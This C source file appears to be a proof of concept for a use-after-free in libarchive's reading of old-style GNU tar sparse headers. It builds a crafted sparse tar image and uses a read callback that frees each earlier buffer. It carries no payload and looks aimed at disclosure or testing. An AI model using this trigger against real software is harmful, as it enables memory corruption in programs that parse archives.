/*
 * PoC: UAF reading an old-style GNU tar sparse header when the client
 * read callback releases its buffer between calls.
 *
 * The archive is a plain old-style GNU tar holding one sparse entry.
 * Its main header carries one sparse map entry and has the 'isextended'
 * flag set, so the reader pulls one additional 512-byte sparse
 * extension block through the read callback while processing the
 * entry header.  The callback below hands each 512-byte block to the
 * library in a freshly allocated heap block and releases the previous
 * one, which is a permitted usage of the public read callback API.
 */
#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BLOCK 512

struct reader_state {
	const unsigned char *image;
	size_t image_size;
	size_t pos;
	unsigned char *block;
};

static void
set_octal(char *field, size_t size, unsigned long long value)
{
	memset(field, 0, size);
	snprintf(field, size, "%0*llo", (int)(size - 1), value);
}

static size_t
build_image(unsigned char *image)
{
	unsigned char *h = image;
	unsigned int sum;
	size_t i;

	memset(image, 0, 4 * BLOCK);

	/* Main header: old-style GNU tar, one sparse entry, extended. */
	memcpy(h + 0, "sparse", 6);			/* name */
	set_octal((char *)h + 100, 8, 0644);		/* mode */
	set_octal((char *)h + 108, 8, 123);		/* uid */
	set_octal((char *)h + 116, 8, 456);		/* gid */
	set_octal((char *)h + 124, 12, 8);		/* size */
	set_octal((char *)h + 136, 12, 123456789);	/* mtime */
	memset(h + 148, ' ', 8);			/* chksum */
	h[156] = 'S';					/* typeflag */
	memcpy(h + 257, "ustar  ", 7);			/* magic "ustar  \0" */
	memcpy(h + 265, "user", 4);			/* uname */
	memcpy(h + 297, "group", 5);			/* gname */
	set_octal((char *)h + 329, 8, 0);		/* rdevmajor */
	set_octal((char *)h + 337, 8, 0);		/* rdevminor */
	/* sparse[0]: 8 bytes at offset 0 */
	set_octal((char *)h + 386, 12, 0);
	set_octal((char *)h + 398, 12, 8);
	h[482] = 1;					/* isextended */
	set_octal((char *)h + 483, 12, 8);		/* realsize */

	sum = 0;
	for (i = 0; i < BLOCK; i++)
		sum += h[i];
	snprintf((char *)h + 148, 7, "%06o", sum);
	h[154] = '\0';
	h[155] = ' ';

	/* Block 1: sparse extension block, no further entries. */
	/* (already zeroed) */

	/* Block 2: 8 bytes of file data, padded. */
	memcpy(image + 2 * BLOCK, "CONTENT!", 8);

	/* Block 3: end-of-archive null block. */

	return (4 * BLOCK);
}

static la_ssize_t
read_block(struct archive *a, void *client_data, const void **buffer)
{
	struct reader_state *st = client_data;

	(void)a;

	/* Release the previous block; the library must not hold onto it. */
	free(st->block);
	st->block = NULL;

	if (st->pos >= st->image_size) {
		*buffer = NULL;
		return (0);
	}

	st->block = malloc(BLOCK);
	if (st->block == NULL)
		return (-1);
	memcpy(st->block, st->image + st->pos, BLOCK);
	st->pos += BLOCK;

	*buffer = st->block;
	return (BLOCK);
}

static int
close_reader(struct archive *a, void *client_data)
{
	struct reader_state *st = client_data;

	(void)a;
	free(st->block);
	st->block = NULL;
	return (ARCHIVE_OK);
}

int
main(void)
{
	static unsigned char image[4 * BLOCK];
	struct reader_state st;
	struct archive_entry *ae;
	struct archive *a;
	int r;

	build_image(image);

	memset(&st, 0, sizeof(st));
	st.image = image;
	st.image_size = sizeof(image);

	a = archive_read_new();
	if (a == NULL) {
		fprintf(stderr, "archive_read_new failed\n");
		return (1);
	}
	archive_read_support_format_tar(a);

	r = archive_read_open(a, &st, NULL, read_block, close_reader);
	if (r != ARCHIVE_OK) {
		fprintf(stderr, "archive_read_open: %s\n", archive_error_string(a));
		return (1);
	}

	r = archive_read_next_header(a, &ae);
	if (r != ARCHIVE_OK) {
		fprintf(stderr, "next_header #1: %s\n", archive_error_string(a));
		return (1);
	}
	printf("entry: %s mode=%o uid=%d gid=%d mtime=%d\n",
	    archive_entry_pathname(ae),
	    archive_entry_perm(ae),
	    (int)archive_entry_uid(ae),
	    (int)archive_entry_gid(ae),
	    (int)archive_entry_mtime(ae));

	r = archive_read_next_header(a, &ae);
	if (r != ARCHIVE_EOF) {
		fprintf(stderr, "next_header #2: expected EOF, got %d (%s)\n",
		    r, archive_error_string(a));
		return (1);
	}

	archive_read_close(a);
	archive_read_free(a);
	printf("done\n");
	return (0);
}
